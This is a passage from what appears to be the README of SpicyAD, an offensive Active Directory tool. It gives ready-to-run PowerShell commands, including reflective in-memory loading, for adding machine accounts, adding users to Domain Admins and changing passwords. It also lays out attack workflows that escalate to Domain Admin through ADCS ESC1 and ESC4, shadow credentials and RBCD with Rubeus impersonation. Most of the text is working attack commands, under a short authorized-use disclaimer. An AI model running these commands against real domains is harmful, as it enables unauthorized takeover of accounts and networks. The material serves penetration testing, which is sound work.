Add a new machine account to the domain.

**Domain-Joined:**
```powershell
.\SpicyAD.exe add-machine /name:YOURPC$
.\SpicyAD.exe add-machine /name:YOURPC$ /mac-pass:P@ssw0rd123
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd add-machine /name:YOURPC$ /mac-pass:P@ssw0rd123
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("add-machine", "/name:YOURPC$", "/mac-pass:P@ssw0rd123")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "add-machine", "/name:YOURPC$", "/mac-pass:P@ssw0rd123")
```

---

#### add-to-group

Add a user to a group.

**Domain-Joined:**
```powershell
.\SpicyAD.exe add-to-group /member:newuser /group:Domain Admins
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd add-to-group /member:newuser /group:Domain Admins
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("add-to-group", "/member:newuser", "/group:Domain Admins")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "add-to-group", "/member:newuser", "/group:Domain Admins")
```

---

#### change-password

Change a user's password.

**Domain-Joined:**
```powershell
.\SpicyAD.exe change-password /target:jdoe /old:OldPass123 /new:NewPass456
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd change-password /target:jdoe /old:OldPass123 /new:NewPass456
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("change-password", "/target:jdoe", "/old:OldPass123", "/new:NewPass456")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "change-password", "/target:jdoe", "/old:OldPass123", "/new:NewPass456")
```

---

## Attack Workflows

### Workflow 0: BloodHound Reconnaissance
```powershell
# 1. Collect AD data for BloodHound
.\SpicyAD.exe bloodhound /collection:all

# 2. Import ZIP into BloodHound CE
# Upload the generated ZIP file to BloodHound CE web interface

# 3. Analyze attack paths
# Use BloodHound to identify:
# - Shortest path to Domain Admin
# - Kerberoastable users with paths to high-value targets
# - Misconfigured ACLs and delegation
# - ADCS vulnerabilities
```

### Workflow 1: ESC1 → Domain Admin
```powershell
# 1. Enumerate vulnerable templates
.\SpicyAD.exe enum-vulns

# 2. Exploit ESC1 (auto-chains to PKINIT)
.\SpicyAD.exe esc1 /template:ESC1 /target:administrator /sid

# 3. Use NT hash or imported ticket
```

### Workflow 2: ESC4 → ESC1 → Domain Admin
```powershell
# 1. Find ESC4 vulnerable templates
.\SpicyAD.exe esc4 list

# 2. Run full attack chain (template is automatically restored)
.\SpicyAD.exe esc4 /template:ESC4 /target:administrator /sid
```

### Workflow 3: Shadow Credentials → Machine Takeover
```powershell
# 1. Add shadow credential to target machine
.\SpicyAD.exe shadow-creds add /target:SERVER$ /sid

# 2. NT hash is automatically extracted via PKINIT

# 3. Use hash for pass-the-hash or silver ticket
```

### Workflow 4: RBCD Attack
```powershell
# 1. Set RBCD
.\SpicyAD.exe rbcd set /target:SERVER$ /controlled:YOURPC$

# 2. Use Rubeus for S4U
Rubeus.exe s4u /user:YOURPC$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/SERVER.evilcorp.net /ptt

# 3. Access target
dir \\SERVER\C$

# 4. Cleanup
.\SpicyAD.exe rbcd clear /target:SERVER$ /force
```

---

## References

| Tool | Author | Description |
|------|--------|-------------|
| [Rubeus](https://github.com/GhostPack/Rubeus) | @harmj0y | Kerberos abuse toolkit |
| [Certify](https://github.com/GhostPack/Certify) | @harmj0y | AD CS enumeration and abuse |
| [Whisker](https://github.com/eladshamir/Whisker) | @elaboratehub | Shadow Credentials attack |
| [Certipy](https://github.com/ly4k/Certipy) | @ly4k | AD CS exploitation (Python) |
| [SharpHound](https://github.com/BloodHoundAD/SharpHound) | BloodHound Team | BloodHound data collector |

### Research

| Resource | Author | Description |
|----------|--------|-------------|
| [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) | SpecterOps | AD CS vulnerabilities whitepaper |
| [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) | Elad Shamir | Shadow Credentials research |
| [The Hacker Recipes](https://www.thehacker.recipes/) | @_nwodtuhs | AD attack documentation |

---

## Legal Disclaimer

This tool is intended for authorized penetration testing and security research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before using this tool.

---

## Credits

YOU, the real infosec gurus, from whom I have learned so much. (Elad samir, HarmJ0y,  Charlie Bromberg ...)

## License

For educational and authorized security testing purposes only.

## TODO
- Delegations attacks
- SCCM enumeration
- More ADCS
- Better share enumeration...
